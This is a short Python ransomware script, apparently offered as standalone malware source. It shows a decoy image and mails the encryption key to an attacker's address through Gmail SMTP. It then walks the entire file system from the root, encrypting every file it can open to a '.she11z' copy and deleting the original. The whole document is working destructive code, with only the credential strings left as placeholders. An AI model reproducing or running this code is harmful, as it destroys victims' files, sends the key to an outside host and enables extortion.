#!/usr/bin/python    
#__Author__ == 'Ananth Venkateswarlu aka she11z'
# Encrypts the file system and mail's the encryption key to the attacker

import os
import sys
import smtplib
import subprocess
from base64 import b64decode
from cryptography.fernet import Fernet

key = Fernet.generate_key()
EMAIL_ADDRESS = b64decode('encoded sender's email address'.decode('utf-8'))
EMAIL_PASSWORD = b64decode('encoded password for above email address'.decode('utf-8'))
EMAIL_HACKER = b64decode('encoded attacker's email address'.decode('utf-8'))

def fake_show():
	command = sys._MEIPASS + "\\wannacry.png" # any image to show user on execution
	subprocess.Popen(command, shell=True)
	
def encrypt(file):

	cipher_suite = Fernet(key)	

	with open(file, 'rb') as org_file:
		plain_data = org_file.read()

		enc_file_name = file + '.she11z'
		encrypted_data = cipher_suite.encrypt(plain_data)

		with open(enc_file_name, 'wb') as enc_file:
			enc_file.write(encrypted_data)

	os.remove(file)

def send_key():
	smtp = smtplib.SMTP('smtp.gmail.com', 587)
	smtp.ehlo()
	smtp.starttls()
	smtp.ehlo()
	smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
	message = key
	smtp.sendmail(EMAIL_ADDRESS, EMAIL_HACKER, message)
	smtp.close()

def action():
	for dirpath, dirnames, filenames in os.walk(os.path.abspath(os.sep)): # to get the start of root directory
		for file_name in filenames:

			try:
				encrypt(os.path.join(dirpath, file_name))			

			except Exception as e:
				pass
			
fake_show() # opens the image to show user
send_key()	# send encryption key to the attacker email
action()	# start encrypting the file system 
